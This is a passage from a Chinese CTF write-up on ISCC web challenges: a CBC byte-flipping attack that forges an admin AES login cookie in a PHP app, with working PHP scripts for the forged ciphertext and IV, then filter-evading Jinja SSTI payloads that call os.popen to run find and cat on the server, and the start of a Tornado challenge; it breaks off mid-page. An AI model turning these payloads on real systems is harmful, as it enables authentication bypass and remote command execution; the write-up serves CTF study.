id="ISCC客服一号冲冲冲（二）"><a href="#ISCC客服一号冲冲冲（二）" class="headerlink" title="ISCC客服一号冲冲冲（二）"></a>ISCC客服一号冲冲冲（二）</h2><blockquote><p>经过激烈的竞争，客服一号终于通过自己的努力（选手的帮助），保住了自己的饭碗（获得了客服的密码），可当他打开客服登录窗口，却发现怎么也登不上去了。<br>你能帮他看看怎么回事吗？ 题目入口：<a href="http://39.96.91.106:8210/">http://39.96.91.106:8210/</a> Flag格式：iscc{XXX}</p></blockquote><p>查看源码，看到login.bmp，下载</p><p>蓝色通道最低位有异常，另存为login.html<br><img src="https://img-blog.csdnimg.cn/20210511231815173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>define(<span class="hljs-string">&quot;SECRET_KEY&quot;</span>, <span class="hljs-string">&#x27;101010031231243214&#x27;</span>);<br>define(<span class="hljs-string">&quot;METHOD&quot;</span>, <span class="hljs-string">&quot;aes-128-cbc&quot;</span>);<br>session_start();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_iv</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$random_iv</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$random_iv</span>.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$random_iv</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;<br>    <span class="hljs-variable">$iv</span> = get_random_iv();<br>    <span class="hljs-variable">$plain</span> = serialize(<span class="hljs-variable">$info</span>);<br>    <span class="hljs-variable">$cipher</span> = openssl_encrypt(<span class="hljs-variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    setcookie(<span class="hljs-string">&quot;iv&quot;</span>, base64_encode(<span class="hljs-variable">$iv</span>));<br>    setcookie(<span class="hljs-string">&quot;cipher&quot;</span>, base64_encode(<span class="hljs-variable">$cipher</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;iv&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$cipher</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]);<br>        <span class="hljs-variable">$iv</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;iv&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$plain</span> = openssl_decrypt(<span class="hljs-variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>))&#123;<br>            <span class="hljs-variable">$info</span> = unserialize(<span class="hljs-variable">$plain</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.base64_encode(<span class="hljs-variable">$plain</span>).<span class="hljs-string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ERROR!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>]=== password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Flag is &#x27;</span>.flag.<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>] == password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You can\&#x27;t see flag&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Sorry,password is incorrect&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-variable">$password</span>);<br>        login(<span class="hljs-variable">$info</span>);<br>        show_homepage();<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]))&#123;<br>        check_login();<br>        show_homepage();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="hljs-string">                &lt;div id=&quot;wrapper&quot; style = &quot;width:800px; height:200px; overflow:hidden;&quot;&gt;</span><br><span class="hljs-string">                    &lt;img class=&quot;img1&quot; src=&quot;login.bmp&quot;  alt=&quot;login&quot; /&gt;</span><br><span class="hljs-string">                &lt;/div&gt;</span><br><span class="hljs-string">            &lt;/body&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>阅读源代码，我们可以知道，只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。</p><p><strong>Bugku Login4</strong>原题，考查CBC字节翻转攻击</p><p>这是组合题,猜测密码是（一）的flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST<br>username=admix&amp;password=<span class="hljs-number">1</span>SCC_2o2l_KeFuu&amp;submit=Login<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210513123828790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目将用户名密码传入数组并序列化得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>接下来进行aes加密，并将得到的cipher和iv进行base64编码放入cookie中(cookie对于攻击者来说可控，所以存在cbc字节翻转攻击)</p><p>明文加密时分组为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;userna</span><br><span class="hljs-string">me&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;<br>s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s<br>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_K</span><br><span class="hljs-string">eFuu&quot;</span>;&#125;　<br></code></pre></td></tr></table></figure><p>因此我们只需要将”x”字节翻转为”n”即可得到flag。</p><p>根据我们得到的关系，已知只需修改前一组密文即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newcipher</span>[<span class="hljs-number">13</span>]=chr(ord(<span class="hljs-number">13</span>) ^ ord(‘x’) ^ ord(‘n’))<br></code></pre></td></tr></table></figure><p>这时我们就会得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>但是由于前一组密文被修改了 所以前一组的明文会出现乱码，因此接下来我们再生成新的iv将前一组明文改回a:2:{s:8:”userna 即可得到flag。</p><p>下面开始操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-comment">#计算cipher</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">明文1：a:2:&#123;s:8:&quot;userna//r</span><br><span class="hljs-comment">明文2：me&quot;;s:5:&quot;admix&quot;;//l字母在第14个字节</span><br><span class="hljs-comment">明文3：s:8:&quot;password&quot;;s</span><br><span class="hljs-comment">明文4：:3:&quot;123&quot;;&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$cipher</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D&#x27;</span>));<br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$cipher</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">设密文1[13]=A,解密(密文2)[13]=B,明文2[13]=C,</span><br><span class="hljs-comment">将A修改为A ^ C,则:</span><br><span class="hljs-comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//A  C X</span><br><span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>] = chr(ord(<span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>]) ^ ord(<span class="hljs-string">&#x27;x&#x27;</span>) ^ ord(<span class="hljs-string">&#x27;n&#x27;</span>));<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$cipher</span>));<br><br><span class="hljs-comment">#Set-Cookie: iv=UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D</span><br><span class="hljs-comment">#Set-Cookie: cipher=y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y2x2UEGxPieluLPfmbWe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%<span class="hljs-number">2</span>F9JXPj%<span class="hljs-number">2</span>FmCm17%<span class="hljs-number">2</span>BVl6eIuWs0BqoaXVDL8%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>这里提示反序列化失败了<br><img src="https://img-blog.csdnimg.cn/20210513124019323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重新计算vi</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#计算iv</span><br><span class="hljs-variable">$res</span> = base64_decode(<span class="hljs-string">&#x27;udWanuvQSROPYCexu0Urn21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30=&#x27;</span>);<span class="hljs-comment">//这里放burp放回的base64数据</span><br><span class="hljs-variable">$iv</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D&#x27;</span>)); <span class="hljs-comment">//这里放cookie中的iv  iv=kCoJjjQMy%2BIQATaagMVpbw%3D%3D;</span><br><span class="hljs-variable">$plaintext</span> = <span class="hljs-string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;<br><span class="hljs-variable">$new_iv</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span> ++)&#123;<br><span class="hljs-variable">$new_iv</span> = <span class="hljs-variable">$new_iv</span> . chr(ord(<span class="hljs-variable">$iv</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$res</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$plaintext</span>[<span class="hljs-variable">$i</span>]));<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$new_iv</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到新的iv值传过去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">irk7Yy8%<span class="hljs-number">2</span>BiF%<span class="hljs-number">2</span>FBu1N2HvpoBw%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>最终flag为<br><img src="https://img-blog.csdnimg.cn/20210513124157498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="lovely-ssti"><a href="#lovely-ssti" class="headerlink" title="lovely ssti"></a>lovely ssti</h2><p>Miao<del>Miao</del>Miao~这里有一只可爱的暹罗猫猫<br>题目入口：<a href="http://39.96.91.106:3010/">http://39.96.91.106:3010/</a></p><p>查看可用字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?xiaodouni=&#123;%<span class="hljs-built_in">print</span>%20lipsum|select|string|list%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522174747622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没做过多少SSTI方面的题，会单独弄篇博客总结SSTI，暂时先贴一下大师傅们的Payload吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php">?xiaodouyu=<br>&#123;%set%<span class="hljs-number">20</span>xiahua=(config|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)[<span class="hljs-number">24</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gb=(xiahua,xiahua,dict(<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">a</span>)|<span class="hljs-title">join</span>,<span class="hljs-title">xiahua</span>,<span class="hljs-title">xiahua</span>)|<span class="hljs-title">join</span>%&#125;</span><br><span class="hljs-class"></span>&#123;%set%<span class="hljs-number">20</span>ini=(xiahua,xiahua,dict(init=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>glo=(xiahua,xiahua,dict(globals=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>oo=dict(o=a,s=a)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>so=oo[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>pp=dict(pop=a,ne=b)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>opo=pp[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>rd=(dict(read=a)|join)%&#125;<br>&#123;%<span class="hljs-keyword">print</span> config|attr(gb)|attr(ini)|attr(glo)|attr(gm)(so)|attr(opo)(<span class="hljs-string">&quot;cat /usr/?????is?here????&quot;</span>)|attr(rd)()%&#125;   <br><br><br>?xiaodouyu=<br>&#123;%set pp=(dict(pop=a))|join%&#125;<br>&#123;%set xiahua=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">24</span>)%&#125;<br>&#123;%set g=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">1</span>)%&#125;<br>&#123;%set gb=(xiahua,xiahua,g,dict(bals=a,lo=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set gm=(xiahua,xiahua,g,dict(e=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set chcr=(lipsum|attr(gb)|attr(gm)(bl))|attr(<span class="hljs-string">&quot;ge&quot;</span><span class="hljs-string">&quot;t&quot;</span>)(<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>)%&#125;<br>&#123;%set dian=chcr(<span class="hljs-number">46</span>)%&#125;<br>&#123;%set space=chcr(<span class="hljs-number">32</span>)%&#125;<br>&#123;%set xing=chcr(<span class="hljs-number">42</span>)%&#125;<br>&#123;%set shell=(<span class="hljs-string">&quot;cat &quot;</span>,<span class="hljs-string">&quot;requirements&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xing)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;cat /usr/fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xiahua,<span class="hljs-string">&quot;is&quot;</span>,xiahua,<span class="hljs-string">&quot;here&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;&#123; lipsum|attr(gb)|attr(gm)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell2)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br><br><br><br>?xiaodouyu=<br>&#123;% set xiahua=(config|<span class="hljs-keyword">string</span>)[<span class="hljs-number">14</span>]%&#125;<br>&#123;% set gb=(xiahua,xiahua,<span class="hljs-string">&quot;globals&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set bl=(xiahua,xiahua,<span class="hljs-string">&quot;builtins&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set cr=(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(bl))[<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>] %&#125;<br>&#123;% set dian=cr(<span class="hljs-number">46</span>)%&#125;<br>&#123;% set xing =cr(<span class="hljs-number">42</span>)%&#125;<br>&#123;% set shell=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fla&quot;</span>,xing)|join%&#125;<br>&#123;% set shell4 = <span class="hljs-string">&quot;cat /usr/fla??is?here?txt&quot;</span>%&#125;<br>&#123;&#123;(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell4))|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522173928909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p>Tornado 是什么呢？<br>题目入口：<a href="http://39.96.91.106:7060/">http://39.96.91.106:7060</a></p><p>在BUU上做过，是道原题<br><img src="https://img-blog.csdnimg.cn/20210503130235264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>从三个链接可以得到以下信息：</p><ol><li>flag.txt：flag在/fllllllllllllaaaaaag文件里面</li><li>welcome.txt：根据提示render，可以知道存在模板注入</li><li>hints.txt：md5(cookie_secret+md5(filename))</li></ol><p>当访问/hints.txt，发现url栏变为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/hints.txt&amp;filehash=c61a0774797a56fc60854ac778aa3d15<br></code></pre></td></tr></table></figure><p>直接访问fllllllllllllaaaaaag文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: /file?filename=/fllllllllllllaaaaaag<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503130631121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>需要计算filehash的值，即md5(cookie_secret+md5(filename))的值。filename已经知道了是/fllllllllllllaaaaaag，下面需要找到cookie_secret。</p><p>Tornado框架的附属文件handler.settings中存在cookie_secret，进行模板注入：</p><figure class="highlight"><table><tr><td 